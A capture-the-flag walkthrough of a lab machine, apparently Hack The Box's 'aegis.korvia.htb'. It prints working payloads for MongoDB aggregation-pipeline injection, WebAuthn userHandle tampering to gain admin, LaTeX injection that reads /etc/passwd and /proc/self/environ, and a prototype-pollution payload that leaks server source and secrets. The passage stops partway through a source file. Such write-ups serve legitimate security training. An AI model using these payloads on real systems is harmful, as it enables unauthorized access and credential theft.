# Odyssey

<figure><img src=".gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

<mark style="color:blue;">**Step 1**</mark>

**Let's start off with a quick nmap scan.**

```bash
ip=10.129.45.112

## TCP Scan
nmap -p- --min-rate 10000 -n -Pn -oA nmap/ghostlink_tcp.htb $ip
# 3000/tcp open  ppp




# Deeper tcp scan
nmap -sC -sV -A -p53,2222,2121,80,8080,3000,5000,9000,8000 -oA nmap/ghostlink_tcp $ip
# 3000/tcp open     http         Node.js Express framework
# |_http-title: Did not follow redirect to http://aegis.korvia.htb:3000/

# UDP scan
nmap -sU --min-rate 10000 -n -Pn -oA nmap/ghostlink_udp.htb $ip

```

<mark style="color:blue;">**Step 2**</mark>

**Let's modify the hosts file and discover the APP**

{% code overflow="wrap" %}
```bash
echo "$ip aegis.korvia.htb" | tee -a /etc/hosts
```
{% endcode %}

<figure><img src=".gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**Technology Stack**

* **Backend**: Node.js with Express framework
* **Frontend**: Likely a single-page app (SPA) given the modern UI
* **Authentication**: FIDO2/WebAuthn hardware authenticator support



**Key Observations**

* Requires an "operator handle" in format `surname.initial` (e.g., `smith.j`)
* Uses hardware authenticators (YubiKey, FIDO2 devices)
* This is a "Directorate 9" restricted system
{% endhint %}

<mark style="color:blue;">**Step 3**</mark>

**however its a modern app that may be difficult but always deep enumration may lead to something interesting**&#x20;

{% code overflow="wrap" %}
```bash
/api/v1/aegis-mds/search

"_id":"69f49023225fb3c680909240","aaguid":"566581a4-5a65-9f87-c652-52851474f127","vendor":"Yubico","description":"YubiKey 5C","protocolFamily":"fido2","schema":3,"authenticatorVersion":100,"upv"
```
{% endcode %}

{% hint style="info" %}
**Looking at this \_id its predictable and give me a probablity thats its a MangoDB Database because the way we write the entry ID and also the value if we compare two value :**

{% code overflow="wrap" %}
```bash
69f49023 225fb3c680  909240
69f49023 225fb3c680  909241
69f49023 225fb3c680  909242
69f49023 225fb3c680  909243

# its a timestamp + same random value + INCREMENT COUNT
# the JSON in the request is a nested JSON because we see a nested array of some object so it's a binary JSON that make a probability that we deal with MongoDB 
```
{% endcode %}
{% endhint %}

**and in the webauth.js we found interesting endpoint**&#x20;

{% code overflow="wrap" %}
```js
async function register(inviteToken) {
    var opts = await postJSON('/api/v1/auth/webauthn/register/begin', { invite_token: inviteToken });
    opts.challenge = b64uToBuf(opts.challenge);
    opts.user.id = b64uToBuf(opts.user.id);
    if (opts.excludeCredentials) {
      opts.excludeCredentials = opts.excludeCredentials.map(function (c) {
        return Object.assign({}, c, { id: b64uToBuf(c.id) });
        

var resp = {
      id: cred.id,
      rawId: bufToB64u(cred.rawId),
      type: cred.type,
      response: {
        clientDataJSON: bufToB64u(cred.response.clientDataJSON),
        attestationObject: bufToB64u(cred.response.attestationObject),
      },
      clientExtensionResults: cred.getClientExtensionResults ? cred.getClientExtensionResults() : {},
    };
    return await postJSON('/api/v1/auth/webauthn/register/finish', resp);
  }


 async function authenticate() {
    var opts = await postJSON('/api/v1/auth/webauthn/auth/begin', {});
    opts.challenge = b64uToBuf(opts.challenge);
    if (opts.allowCredentials) {
      opts.allowCredentials = opts.allowCredentials.map(function (c) {
        return Object.assign({}, c, { id: b64uToBuf(c.id) });
      });
```
{% endcode %}

**Now to start our main idea is to find a way to steal the token i tried many nosql injection but it doesnt give me anything so we still search on the web app**

<mark style="color:blue;">**Step 4**</mark>&#x20;

[https://soroush.me/blog/mongodb-nosql-injection-with-aggregation-pipelines](https://soroush.me/blog/mongodb-nosql-injection-with-aggregation-pipelines)

**I found this blog that its talking abount nosql injection with aggragations pipelines since the sites uses pipelines it cound be an attack vector**

**so our testing will be nosql injection here with aggregation pipelines**

{% code overflow="wrap" %}
```bash
http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?q[$gt]=5&limit=1 

{"error":"InvalidQueryShape","detail":"Operator-form queries not accepted on 'q'. Use the 'pipeline' parameter for advanced queries.","trace_id":"mds-2a1e4d"}
```
{% endcode %}

{% code overflow="wrap" %}
```bash
http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline[$gt]=12&limit=1
# this give me 400 bad request so we may be need to update the request 
```
{% endcode %}

**I tried a multipe things and paylaod but i think am on a dead end or still need something so i need to search more**&#x20;

**i start fuzzing from scartch the /api/v1 because am sure its our entry point we need just to leak the token**&#x20;

{% code overflow="wrap" %}
```bash
feroxbuster --url http://aegis.korvia.htb:3000/api/v1/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt --force-recursion -t 50 

feroxbuster --url http://aegis.korvia.htb:3000/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50 -m GET,POST,PUT,DELETE,OPTIONS,HEAD --status-codes 200,301,302,400,500 --filter-size 28
# 400      GET       66l      184w     2543c http://aegis.korvia.htb:3000/onboard
```
{% endcode %}

**i get it after 3 hours of fuzzing LoL !!, this  endpoints looks interesting**&#x20;

<figure><img src=".gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

**so our testing will be nosql injection here with aggregation pipelines**

{% code overflow="wrap" %}
```bash
http://aegis.korvia.htb:3000/onboard/13213223
# No matching record in pending_invites  (token may have been redeemed, expired, or never issued)
```
{% endcode %}

**We uncovered the exact name of the database collection we need to attack &#x20;**<mark style="color:red;">**(pending\_invites)**</mark>

**I think this is what we miss in our NoSQL injection**

{% code overflow="wrap" %}
```
http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline=[{"$lookup":{"from":"pending_invites","pipeline":[{"$match":{}}],"as":"invites"}},{"$project":{"invites":1,"_id":0}},{"$unwind":"$invites"},{"$replaceRoot":{"newRoot":"$invites"}}]&limit=1

{"error":"invalid or disallowed pipeline stage"}
```
{% endcode %}

**So i think we hit a defense mecanism now the $match is blocked we try other stages, so to build the best payload we need to have an idea if basic sanity injcetion pass**

{% code overflow="wrap" %}
```
http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline=[{"$match":{"vendor":"Yubico"}}]&limit=1

and it pass it return Yubico
```
{% endcode %}

**i tried $unionWith and also its blocked**

{% code overflow="wrap" %}
```
http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline=[{"$project":{"vendor":1}}]&limit=1 

it pass it reveal all vendors
```
{% endcode %}

**But we need to read the tokens from pending\_invites**

**i will test $facet that run multipe stage in parallel it may bypass the blacklisted ones**

{% code overflow="wrap" %}
```
http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline=[{"$facet":{"tokens":[{"$unionWith":{"coll":"pending_invites"}}]}}]&limit=1

and boom it pass i have all tokens of all vendors
```
{% endcode %}

<mark style="color:blue;">**Step 5**</mark>

**Le'ts make things together**

<figure><img src=".gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

**when i check all data there is one token that get expired at 2126 all others already expired**&#x20;

{% code overflow="wrap" %}
```json
{"_id":"69f49023225fb3c680909274","operator_id":"op-2026-0042","role":"Operator","token":"dad657731b2c7a2190fa167b388a2ddbc17b78ba6c6be1c3b169c4cff97a5238","issued_by":"ao-mreyes","issued_at":"2026-04-15T08:00:00.000Z","expires_at":"2126-05-15T00:00:00.000Z","redeemed":false,"pipeline":"forge-recruitment","clearance_target":"Δ-3"}
```
{% endcode %}

<figure><img src=".gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

**so the main idea is when we try to register from the browser it doesnt pass because its like you do a request outside the browser so using devtools we will try to create a virtual webauth like its coming from localhost , the idea is to perform a virtual web auth on chrome but we need to change some confis on chrome to make the site secure and trusted by chrome to get the Webauth catched on devtools**

1. `chrome://flags/#unsafely-treat-insecure-origin-as-secure`
2. search  Insecure origins treated as secure
3. [http://aegis.korvia.htb:3000](http://aegis.korvia.htb:3000) and enabled then relaunch&#x20;

<br>

<figure><img src=".gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

**it the same problem but we get much inforamtion from here so the solutions is to build a python or C script that do this we have an idea of have the key is build and all things** <br>

{% code overflow="wrap" %}
```html
PublicKeyCredentialCreationOptions
"rp": 
"id": "aegis.korvia.htb",
"name": "AEGIS — Sovereign Signing & Attestation Authority"
},
"user": 
"id": "b3AtMjAyNi0wMDQy",
"name": "op-2026-0042",
"displayName": "op-2026-0042"
},
"challenge": "0VDyTM-dskfX-Tq0iC2LkucaWtkDWApcZSnAhlts7_w",
"pubKeyCredParams": 
"type": "public-key",
"alg": -7
},
"type": "public-key",
"alg": -257
}
],
"timeout": 60000,
"authenticatorSelection": 
"residentKey"
: "required",
"userVerification"
: "preferred",
"requireResidentKey"
: true
},
"attestation": "none",
"extensions": 
"credProps": true
}
}
```
{% endcode %}

**so after deep searching on browser and understanding things i can setup i reverse proxy using to register and save a passkey on my browser then i will use it to authentificate**

{% code overflow="wrap" %}
```bash
wget https://github.com/FiloSottile/mkcert/releases/download/v1.4.4/mkcert-v1.4.4-linux-amd64
chmod +x mkcert-v1.4.4-linux-amd64
sudo mv mkcert-v1.4.4-linux-amd64 /usr/local/bin/mkcert
mkcert aegis.korvia.htb
```
{% endcode %}

{% code overflow="wrap" %}
```bash
# reverse proxy setup
sudo nano /etc/nginx/sites-available/aegis
server {
    listen 443 ssl;
    server_name aegis.korvia.htb;

    # Point to the exact paths where mkcert saved the files
    ssl_certificate /home/gb05/Desktop/CPTS_PREP/aegis.korvia.htb.pem;
    ssl_certificate_key /home/gb05/Desktop/CPTS_PREP/aegis.korvia.htb-key.pem;

    location / {
        proxy_pass http://10.129.45.250:3000;
        # Ensure the backend still sees the correct hostname
        proxy_set_header Host aegis.korvia.htb;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```
{% endcode %}

{% code overflow="wrap" %}
```bash
sudo ln -s /etc/nginx/sites-available/aegis /etc/nginx/sites-enabled/
sudo nginx -t && sudo systemctl reload nginx
```
{% endcode %}

**Then on /etc/hosts change the ip to 127.0.0.1**&#x20;

**Then reload the browser and it work**

<figure><img src=".gitbook/assets/Capture d&#x27;écran 2026-07-03 000742.png" alt=""><figcaption></figcaption></figure>

**click Next -> Save -> create a password for him on Manager Password for google -> Done**

<figure><img src=".gitbook/assets/Capture d&#x27;écran 2026-07-03 000802.png" alt=""><figcaption></figcaption></figure>

**Then it will redirect to login page click login**&#x20;

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

**after fuzzing another time and crawling the app i found in the audit this**&#x20;

| 2026-04-29 14:08 | admin | pruned 4 stale operator credentials (90d inactivity) |
| ---------------- | ----- | ---------------------------------------------------- |

{% hint style="info" %}
**The admin deleted the WebAuthn hardware key bindings for 4 specific**

**we have two attack vector we will test them both**&#x20;

* **The "Stale Account" Takeover (Account Hijacking)**
* **MongoDB Aggregation Pipeline Write**

**So from here we know first that there is an admin role so we can assign this role to our operator user**&#x20;
{% endhint %}

**so also when seeing the blog we can update the DATA, however it doesnt work because when the stages to update its blacklisted.**

**i spend time to understand the regiter logic and the login logic i found that when we login in this request /api/v1/auth/webauthn/auth/finish it contain an entry userHandle**&#x20;

{% code overflow="wrap" %}
```bash
"userHandle":"b3AtMjAyNi0wMDQy"
# if we decode it in base64 it give our current user op-2026-042
```
{% endcode %}

**so the idea if we can hijack this it can give us the role admin but the idea i start with is to add this entry when i register the passkey but when i finish and i try to register it give me this**&#x20;

{% code overflow="wrap" %}
```
Authentication failed: OperatorNotFound: No active operator with handle 'admin 
```
{% endcode %}

**Then i tried to jist change it on the on the login and it work because also in the webauth.js there is no validation for this so we can put anything , i encode in base64 admin and i put it**&#x20;

**then after in the login it work**

<figure><img src=".gitbook/assets/Capture d&#x27;écran 2026-07-03 025831.png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

<mark style="color:blue;">**Step 6**</mark>

**Now we should found a way to have a rev-shell,let's enumarete the app very well and do some hard fuzzing**

<figure><img src=".gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

**I tried SSRF here in the URL i tried many paylaods but nothign pass all gives 404 so i think its not because doesnt exsit but its seems a firewall blocks our payload**

**i found this pending authorization**

<figure><img src=".gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

**This is a code signing system for critical software (Windows kernel drivers, firmware). As an admin (Authorising Officer), however The "Notice Templates" system is a classic SSTI target. Templates are used to generate signing certificates/notices. If i can inject template code, i get Remote Code Execution.**

<figure><img src=".gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

**The template engine uses `{{ }}` and `{% %}` syntax, which is characteristic of Nunjucks (common in Node.js/Express) or Jinja2 (Python). Since we know the backend is Express, it is almost certainly Nunjucks.**<br>

**so in the template body i inject `{{7*7}}`**

**i save it then i click rendre preview i receive this**&#x20;

<figure><img src=".gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**i dont see any response but it can be blind because its executed in the backend from this i can understand how the process work**&#x20;

1. **Nunjucks evaluates** `{{ 7 * 7 }}` → becomes `49`
2. **Pandoc converts** the template to LaTeX
3. **LaTeX/PDFLaTeX creates** a PDF document
4. **The PDF is saved** to: `/var/lib/aegis-render/jobs/job-1783090909445-eab06cba/notice.final.pdf`
{% endhint %}

**However this is its just an hypothese we need to confirm it**&#x20;

{% code overflow="wrap" %}
```bash
\input{/etc/passwd} # LaTex Injection

) (/etc/passwd
! Missing $ inserted.
<inserted text> 
                $
l.17 _
      apt:x:42:65534::/nonexistent:/usr/sbin/nologin
      

Overfull \hbox (57.68275pt too wide) in paragraph at lines 1--15
[]\T1/lmr/m/n/10 root:x:0:0:root:/root:/bin/bash dae-mon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin
 []


Overfull \hbox (59.43445pt too wide) in paragraph at lines 1--15
\T1/lmr/m/n/10 sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin
 []


Overfull \hbox (138.23726pt too wide) in paragraph at lines 1--15
\T1/lmr/m/n/10 man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
 []


Overfull \hbox (179.87813pt too wide) in paragraph at lines 1--15
\T1/lmr/m/n/10 news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
 []


Overfull \hbox (24.7382pt too wide) in paragraph at lines 1--15
\T1/lmr/m/n/10 www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
 []


Overfull \hbox (3.30363pt too wide) in paragraph at lines 1--15
\T1/lmr/m/n/10 list:x:38:38:Mailing List Man-ager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin $[]\OML/lmm/m/it/10 pt \OT1/lmr/m/n/10 :
 []
```
{% endcode %}

**I receive a huge output containg some errors, its a huge win the intersting part is this we confirmed an LFI, so we need to chain all this to have more impact**&#x20;

**i inject advanced command injection via the template body and the errors i receive make me have a clear idea of what we dealing**&#x20;

{% hint style="info" %}
1. **`\write18` is disabled: The line `runsystem(id > /tmp/rce_out.txt)...disabled.` confirms that LaTeX shell escape is turned off.I cannot execute commands directly via LaTeX.**
2. **Markdown is mangling your backslashes: The error `\catcode\texttt{\textbackslash{}\_=12...}` shows that the web interface (likely using Pandoc/Markdown) is converting your `\catcode\_=12` into a code block `\texttt{...}`. This breaks the LaTeX syntax.**
{% endhint %}

**i tried ASCII Catcodes + LFI and it work i can read environment varilables**&#x20;

{% code overflow="wrap" %}
```bash
\begingroup \catcode 95=12 \catcode 38=12 \catcode 35=12 \catcode 37=12 \catcode 36=12 \input{/proc/self/environ} \endgroup
```
{% endcode %}

{% code overflow="wrap" %}
```
DB_USER=aegis_audit_publisher
DB_PASS=Rxd!Qw6n8sP..2bJ@Wpx-2026
DB_HOST=172.16.0.11
DB_DB=aegis_audit
DB_PORT=1433
Worker Script Path: /home/webadmin/aegis/lib/render_worker.js
User Context: The process runs as aegis-render but was started via sudo by webadmin (UID 1000)
```
{% endcode %}

**I tried many payloads but :**

{% hint style="info" %}
**The Ghostscript sandbox (`-dSAFER`) and LaTeX's `-no-shell-escape` flag are blocking direct command execution. This is a common hardening measure (Having this infos from reading /proc/self/cmdline)**
{% endhint %}

**i try maniulate this parameters**

<figure><img src=".gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**Making AllowRawBlocks to True but i receive that this its just affecting Pandoc (allowing raw LaTeX blocks to pass through), am sure am playing around to chain all things to found the real and functional attack path so we need just to be more overlooking all things together**
{% endhint %}

{% hint style="warning" %}
#### The Rendering Pipeline Explained

When we click Render Preview :

**Stage 1: Nunjucks (Node.js Template Engine)**

**Stage 2: Pandoc (Document Converter)**

**Stage 3: pdflatex (LaTeX Compiler)**

**Stage 4 & 5: dvips & Ghostscript (PostScript to PDF)**
{% endhint %}

**but we hit a hard block, like the app relies on a strict configuration  object to decide whether to enable dangerous features**

**If we can pollute that object's prototype, we can change the application's behavior without having direct access to the code**

**looking at devtools network the response when we click render we confirm what we said**&#x20;

{% code overflow="wrap" %}
```js
{
    "ok": true,
    "finalStage": "gs",
    "artifactPath": "/var/lib/aegis-render/jobs/job-1783095028914-54814c12/notice.final.pdf",
    "durationMs": 365,
    "stages": [
        {
            "stage": "nunjucks",
            "code": 0,
            "durationMs": 4,
            "stderr": "",
            "stdout": ""
        },
        {
            "stage": "pandoc",
            "code": 0,
            "durationMs": 14,
            "cmd": "/usr/bin/pandoc --from markdown-raw_attribute --to latex --standalone --template /var/lib/aegis-render/jobs/job-1783095028914-54814c12/authcert.tex -o /var/lib/aegis-render/jobs/job-1783095028914-54814c12/notice.tex /var/lib/aegis-render/jobs/job-1783095028914-54814c12/notice.md",
            "stderr": "",
            "stdout": ""
        },
        {
            "stage": "pdflatex",
            "code": 0,
            "durationMs": 141,
            "cmd": "/usr/bin/pdflatex -interaction=batchmode -no-shell-escape -output-directory /var/lib/aegis-render/jobs/job-1783095028914-54814c12 /var/lib/aegis-render/jobs/job-1783095028914-54814c12/notice.tex",
            "stderr": "",
            "stdout": "This is pdfTeX, Version 3.141592653-2.6-1.40.28 (TeX Live 2025/Debian) (preloaded format=pdflatex)\nentering extended mode\n"
        },
        {
            "stage": "latex",
            "code": 0,
            "durationMs": 122,
            "cmd": "/usr/bin/latex -interaction=batchmode -no-shell-escape -output-directory /var/lib/aegis-render/jobs/job-1783095028914-54814c12 /var/lib/aegis-render/jobs/job-1783095028914-54814c12/notice.tex",
            "stderr": "",
            "stdout": "This is pdfTeX, Version 3.141592653-2.6-1.40.28 (TeX Live 2025/Debian) (preloaded format=latex)\nentering extended mode\n"
        },
        {
            "stage": "dvips",
            "code": 0,
            "durationMs": 21,
            "cmd": "/usr/bin/dvips -q -o /var/lib/aegis-render/jobs/job-1783095028914-54814c12/notice.ps /var/lib/aegis-render/jobs/job-1783095028914-54814c12/notice.dvi",
            "stderr": "",
            "stdout": ""
        },
        {
            "stage": "gs",
            "code": 0,
            "durationMs": 61,
            "cmd": "/usr/bin/gs -dBATCH -dNOPAUSE -dSAFER -dQUIET -sDEVICE=pdfwrite -sOutputFile=/var/lib/aegis-render/jobs/job-1783095028914-54814c12/notice.final.pdf /var/lib/aegis-render/jobs/job-1783095028914-54814c12/notice.ps",
            "stderr": "",
            "stdout": ""
        }
    ]
}
```
{% endcode %}

<figure><img src=".gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

**if we can control Pandoc mechanism we can successfully leak all data because using latex injection  because the problem is when we read arbitary data the pandoc crash we receive pieces from file but it can't lead us to nothing or may we should be more polluating the prameters**

<figure><img src=".gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**`! LaTeX Error: Can be used only in preamble.` - `\usepackage{verbatim}` can only be used before `\begin{document}`, but our template body is injected into the document body, so it failed, and also we cant use external package**
{% endhint %}

**current `body` is just raw TeX commands, but Pandoc sees them as text and escapes them.**

<figure><img src=".gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

**This also doesnt work**&#x20;

**finally after using this blog** [**https://rxiv-maker.henriqueslab.org/advanced/latex-injection/**](https://rxiv-maker.henriqueslab.org/advanced/latex-injection/)

**i can have multipe method to inject, in fact we succesffuly inject before but we get the data crashed sometimes we know the webroot but when we reed to red the server.js i couldn't**

<mark style="color:red;">**I have one question in mind why the /etc/passwd i read it using /input but a complex code i cant ?**</mark>

**After deep searching i found that**&#x20;

{% hint style="info" %}
When we  use `\input{server.js}`, TeX doesn't just read the file - it **typesets** it. This means:

* Every character is interpreted through the **catcode table** (so `_` becomes subscript, `$` becomes math mode, etc.)
* The **font engine** switches fonts based on the content (that's why you see `\OML/lmm/m/it/10` prefixes)
* The **paragraph builder** breaks long lines and creates overfull hbox warnings
* Special characters like `/` get converted to `=` due to font encoding
{% endhint %}

{% hint style="info" %}
The `\read` primitive is a **low-level file I/O operation** that:

* Reads raw bytes from the file
* Stores them directly into a macro variable **without any interpretation**
* No catcode conversion
* No font switching
* No paragraph building
* The data remains a pure string
{% endhint %}

<figure><img src=".gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

**The `\typeout` command is being suppressed because `pdflatex` is running with `-interaction=batchmode`. We need a different approach to exfiltrate the data.**\
**so we use the errmessage**

{% code overflow="wrap" %}
```
{
  "body": "\\newread\\file \\openin\\file=/home/webadmin/aegis/server.js \\loop\\unless\\ifeof\\file \\read\\file to\\myline \\errmessage{\\myline} \\repeat \\closein\\file",
  "overrides": "{\"__proto__\":{\"allowRawBlocks\":true},\"audience\":\"internal\",\"ceremony_witness\":\"s.vrana\"}"
}
```
{% endcode %}

<figure><img src=".gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```javascript
const path = require('path');
const express = require('express');
const session = require('express-session');
const nunjucks = require('nunjucks');
const mongo = require('./db/mongo');
const sql = require('./db/sql');
const MssqlSessionStore = require('./lib/sql_session_store');

const app = express();
const PORT = process.env.PORT || 3000;
const HOST = process.env.HOST || '0.0.0.0';

app.set('trust proxy', 1);

const env = nunjucks.configure(path.join(__dirname, 'views'), { 
    autoescape: true, 
    express: app, 
    noCache: true 
});

env.addGlobal('CLASSIFICATION', 'TOP SECRET // KORVIA EYES ONLY // D9-RESTRICTED');
env.addGlobal('SYSTEM', { 
    name: 'AEGIS', 
    longName: 'Sovereign Signing & Attestation Authority', 
    agency: 'Directorate 9', 
    build: '7.4.2-prod', 
    node: 'aegis-prod-01' 
});

const AEGIS_HOST = "aegis.korvia.htb";

app.use((req, res, next) => { 
    const host = (req.headers.host || "").replace(/:.*/, ""); 
    if (host !== AEGIS_HOST) { 
        return res.redirect(301, "http://" + AEGIS_HOST + ":" + PORT + req.originalUrl); 
    } 
    next(); 
});

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

app.use(session({ 
    name: 'aegis.sid', 
    secret: process.env.AEGIS_SESSION_SECRET || 'aegis-prod-fixed-secret-d9-restricted-do-not-rotate', 
    store: new MssqlSessionStore({ ttlMs: 30 * 24 * 60 * 60 * 1000 }), 
    resave: false, 
    saveUninitialized: false, 
    rolling: true, 
    cookie: { 
        httpOnly: true, 
        sameSite: 'lax', 
        maxAge: 30 * 24 * 60 * 60 * 1000 
    } 
}));

app.use((req, res, next) => { 
    res.locals.path = req.path; 
    if (req.session && req.session.userId) { 
        res.locals.user = { 
            id: req.session.userId, 
            handle: req.session.userHandle, 
            role: req.session.userRole 
        }; 
    } else { 
        res.locals.user = null; 
    } 
    next(); 
});

app.use('/', require('./routes/mds'));
app.use('/', require('./routes/mds_diag'));
app.use('/', require('./routes/onboard'));
app.use('/', require('./routes/webauthn'));
app.use('/', require('./routes/templates'));
app.use('/', require('./routes/index'));

app.use((req, res) => { 
    res.status(404).render('error.njk', { 
        code: 404, 
        title: 'Resource Not Located', 
        detail: 'The requested object does not exist or your clearance is insufficient.' 
    }); 
});

async function waitForDeps() {
    // Mongo: hard requirement, retry forever in 5s steps (mongod is local, should come up fast)
    for (;;) {
        try {
            await mongo.init();
            console.log('MDS shard connected.');
            break;
        } catch (e) {
            console.error('MDS shard unreachable, retrying in 5s:', e.message);
            await new Promise(r => setTimeout(r, 5000));
        }
    }
    
    // SQL: retry forever in 5s steps until pool is ready
    for (;;) {
        try {
            await sql.init();
            console.log('AEGIS SQL connected.');
            break;
        } catch (e) {
            console.error('AEGIS SQL unreachable, retrying in 5s:', e.message);
            await new Promise(r => setTimeout(r, 5000));
        }
    }
}

(async () => {
    await waitForDeps();
    app.listen(PORT, HOST, () => {
        console.log(`AEGIS listening on http://${HOST}:${PORT}`);
    });
})();
```
{% endcode %}

**We have the secret session and we have two toher js files that may be we did not use them yet thee mdg and the mdg\_diag let's discover them**&#x20;

**mdg.js**

{% code overflow="wrap" %}
```java
const express = require('express');
const router = express.Router();
const { getDb } = require('../db/mongo');

const ALLOWED_STAGES = ['$match', '$project', '$sort', '$limit', '$facet'];

function makeTraceId() {
  const hex = '0123456789abcdef';
  let s = 'mds-';
  for (let i = 0; i < 6; i++) s += hex[Math.floor(Math.random() * 16)];
  return s;
}

function isOperatorObject(v) {
  if (v === null || typeof v !== 'object' || Array.isArray(v)) return false;
  for (const k of Object.keys(v)) {
    if (typeof k === 'string' && k.startsWith('$')) return true;
  }
  return false;
}

router.get('/api/v1/aegis-mds/search', async (req, res) => {
  const trace = makeTraceId();
  let coll;
  try {
    coll = getDb().collection('mds_entries');
  } catch (e) {
    return res.status(503).json({
      error: 'ServiceUnavailable',
      detail: 'MDS shard not initialised',
      trace_id: trace
    });
  }

  if (Object.prototype.hasOwnProperty.call(req.query, 'pipeline')) {
    const raw = req.query.pipeline;
    let pipeline;
    try {
      pipeline = JSON.parse(raw);
    } catch (e) {
      return res.status(400).end();
    }
    if (!Array.isArray(pipeline)) {
      return res.status(400).end();
    }

    for (const stage of pipeline) {
      if (!stage || typeof stage !== 'object' || Array.isArray(stage)) {
        return res.status(400).end();
      }
      const keys = Object.keys(stage);
      if (keys.length !== 1) {
        return res.status(400).end();
      }
      const stageName = keys[0];
      if (!ALLOWED_STAGES.includes(stageName)) {
        return res.status(400).json({ error: 'invalid or disallowed pipeline stage' });
      }
    }

    try {
      const cursor = coll.aggregate(pipeline, {
        allowDiskUse: false,
        maxTimeMS: 4000
      });
      const docs = await cursor.toArray();
      return res.json(docs);
    } catch (e) {
      return res.status(500).json({
        error: e.name || 'MongoServerError',
        detail: e.message || String(e),
        ns: e.ns || `${getDb().databaseName}.mds_entries`,
        trace_id: trace,
      });
    }
  }

  if (Object.prototype.hasOwnProperty.call(req.query, 'q')) {
    const q = req.query.q;
    if (isOperatorObject(q)) {
      return res.status(400).json({
        error: 'InvalidQueryShape',
        detail: "Operator-form queries not accepted on 'q'. Use the 'pipeline' parameter for advanced queries.",
        trace_id: trace,
      });
    }
    const text = typeof q === 'string' ? q.trim() : '';
    const limit = Math.min(parseInt(req.query.limit, 10) || 25, 100);
    let filter = {};
    if (text) {
      const safe = text.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
      const rx = new RegExp(safe, 'i');
      filter = {
        $or: [
          { description: rx },
          { vendor: rx },
          { aaguid: rx }
        ]
      };
    }
    try {
      const docs = await coll.find(filter).limit(limit).toArray();
      return res.json(docs);
    } catch (e) {
      return res.status(500).json({
        error: 'MongoServerError',
        detail: e.message,
        trace_id: trace
      });
    }
  }

  try {
    const docs = await coll.find({}).limit(25).toArray();
    return res.json(docs);
  } catch (e) {
    return res.status(500).json({
      error: 'MongoServerError',
      detail: e.message,
      trace_id: trace
    });
  }
});

router.get('/api/v1/aegis-mds/entry/:id', async (req, res) => {
  const trace = makeTraceId();
  const id = String(req.params.id || '');
  try {
    const doc = await getDb().collection('mds_entries').findOne({ aaguid: id });
    if (!doc) return res.status(404).json({
      error: 'NotFound',
      detail: 'No MDS entry with that AAGUID.',
      trace_id: trace
    });
    return res.json(doc);
  } catch (e) {
    return res.status(500).json({
      error: 'MongoServerError',
      detail: e.message,
      trace_id: trace
    });
  }
});

module.exports = router;
```
{% endcode %}

**And we know the allowed stages that we discover earlier and our hypotheses was true**&#x20;

**./routes/template.js**

{% code overflow="wrap" %}
```java
// AEGIS admin templates routes — list, edit, save, render.
//
// Render flow: web hands a job spec to the renderer worker via sudo (the
// worker drops to the `aegis-render` principal so any rendering bug lands
// in an isolated context — see ICR-2024-0142). The worker writes
// `result.json`; we summarise it into the render_diagnostics table and
// return the latest status to the editor's diagnostics panel.

const express = require('express');
const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const { spawn } = require('child_process');
const sql = require('../db/sql');

const router = express.Router();

const RENDER_WORKER = '/home/webadmin/aegis/lib/render_worker.js';
const RENDER_USER = 'aegis-render';
const JOB_ROOT = '/var/lib/aegis-render/jobs';
const RENDER_TIMEOUT_MS = 25000;

function requireAdmin(req, res, next) {
  if (!req.session || !req.session.userId) return res.redirect('/login');
  if (req.session.userRole !== 'Administrator') {
    return res.status(404).render('error.njk', {
      code: 404,
      title: 'Resource Not Located',
      detail: 'The requested object does not exist or your clearance is insufficient.',
    });
  }
  next();
}

async function listTemplates() {
  const p = sql.getPool();
  const r = await p.request().query(
